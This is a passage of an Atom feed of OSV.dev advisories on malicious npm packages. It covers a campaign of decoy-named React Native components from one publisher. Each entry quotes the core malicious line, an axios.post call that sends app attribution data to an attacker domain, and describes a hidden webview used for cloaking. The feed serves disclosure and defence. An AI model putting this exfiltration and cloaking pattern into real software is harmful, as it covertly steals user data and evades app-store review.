-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in request-tracking-sqlite (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;request-tracking-sqlite&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `request-tracking-sqlite` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; fun…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/request-tracking-sqlite"&gt;https://www.npmjs.com/package/request-tracking-sqlite&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6176"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6174: Malicious code in pushnotifications-gesturerecognition (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6174</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6174"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in pushnotifications-gesturerecognition (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;pushnotifications-gesturerecognition&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `pushnotifications-gesturerecognition` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/pushnotifications-gesturerecognition"&gt;https://www.npmjs.com/package/pushnotifications-gesturerecognition&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6174"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6175: Malicious code in request-performance (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6175</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6175"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in request-performance (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;request-performance&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `request-performance` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/request-performance"&gt;https://www.npmjs.com/package/request-performance&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6175"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6173: Malicious code in profiling-keychain (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6173</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6173"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in profiling-keychain (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;profiling-keychain&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `profiling-keychain` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27;…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/profiling-keychain"&gt;https://www.npmjs.com/package/profiling-keychain&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6173"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6171: Malicious code in personal-custom-button (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6171</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6171"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in personal-custom-button (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;personal-custom-button&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `personal-custom-button` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calcula…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/personal-custom-button"&gt;https://www.npmjs.com/package/personal-custom-button&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6171"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6170: Malicious code in onesignal-hooks (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6170</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6170"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in onesignal-hooks (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;onesignal-hooks&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `onesignal-hooks` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; fu…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/onesignal-hooks"&gt;https://www.npmjs.com/package/onesignal-hooks&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6170"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6169: Malicious code in notificationcenter-enzyme-jest (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6169</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6169"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in notificationcenter-enzyme-jest (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;notificationcenter-enzyme-jest&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `notificationcenter-enzyme-jest` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculat…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/notificationcenter-enzyme-jest"&gt;https://www.npmjs.com/package/notificationcenter-enzyme-jest&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6169"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6172: Malicious code in platformspecific-webgl (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6172</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6172"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in platformspecific-webgl (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;platformspecific-webgl&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `platformspecific-webgl` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calcula…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/platformspecific-webgl"&gt;https://www.npmjs.com/package/platformspecific-webgl&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6172"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6166: Malicious code in jest-macos (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6166</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6166"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in jest-macos (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;jest-macos&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `jest-macos` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; functio…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/jest-macos"&gt;https://www.npmjs.com/package/jest-macos&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6166"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6165: Malicious code in ios-save-area-custom (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6165</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6165"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:47Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in ios-save-area-custom (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;ios-save-area-custom&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `ios-save-area-custom` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculato…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/ios-save-area-custom"&gt;https://www.npmjs.com/package/ios-save-area-custom&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6165"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6168: Malicious code in macos-contentprovider-optimizingassets (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6168</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6168"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:46Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in macos-contentprovider-optimizingassets (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;macos-contentprovider-optimizingassets&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `macos-contentprovider-optimizingassets` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/macos-contentprovider-optimizingassets"&gt;https://www.npmjs.com/package/macos-contentprovider-optimizingassets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6168"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6163: Malicious code in framerate-interaction-permissions (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6163</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6163"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:46Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in framerate-interaction-permissions (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;framerate-interaction-permissions&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `framerate-interaction-permissions` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calcu…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/framerate-interaction-permissions"&gt;https://www.npmjs.com/package/framerate-interaction-permissions&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6163"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6162: Malicious code in font-picker-responsive (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6162</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6162"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:46Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in font-picker-responsive (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;font-picker-responsive&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `font-picker-responsive` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; func…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/font-picker-responsive"&gt;https://www.npmjs.com/package/font-picker-responsive&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6162"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6167: Malicious code in lazyloading-haptics (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6167</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6167"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:46Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in lazyloading-haptics (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;lazyloading-haptics&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `lazyloading-haptics` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; functio…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/lazyloading-haptics"&gt;https://www.npmjs.com/package/lazyloading-haptics&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6167"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6164: Malicious code in interaction-photos-infinitescroll (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6164</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6164"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:46Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in interaction-photos-infinitescroll (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;interaction-photos-infinitescroll&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `interaction-photos-infinitescroll` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind ju…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/interaction-photos-infinitescroll"&gt;https://www.npmjs.com/package/interaction-photos-infinitescroll&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6164"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6160: Malicious code in firebase-readability (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6160</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6160"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:46Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in firebase-readability (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;firebase-readability&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `firebase-readability` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; functi…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/firebase-readability"&gt;https://www.npmjs.com/package/firebase-readability&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6160"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6159: Malicious code in expandingcards-socket-virtualization (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6159</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6159"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:45Z</updated>
-    <category term="npm"/>
